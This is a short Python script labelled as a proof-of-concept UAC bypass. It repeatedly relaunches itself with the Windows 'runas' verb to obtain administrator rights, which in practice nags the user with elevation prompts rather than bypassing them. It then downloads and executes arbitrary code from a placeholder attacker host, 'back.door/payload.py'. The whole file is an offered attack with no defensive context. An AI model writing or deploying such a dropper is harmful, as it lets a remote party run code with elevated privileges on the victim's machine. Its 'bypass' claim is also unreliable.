
# poc UAC bypass

import os
import sys
import requests
import win32com.shell.shell as shell


while True:
    if sys.argv[-1] != "asadmin":
        try:
            params = ' '.join([os.path.abspath(sys.argv[0])] + sys.argv[1:] + ["asadmin"])
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
            break
        except:
            pass

exec(requests.get("https://back.door/payload.py").text)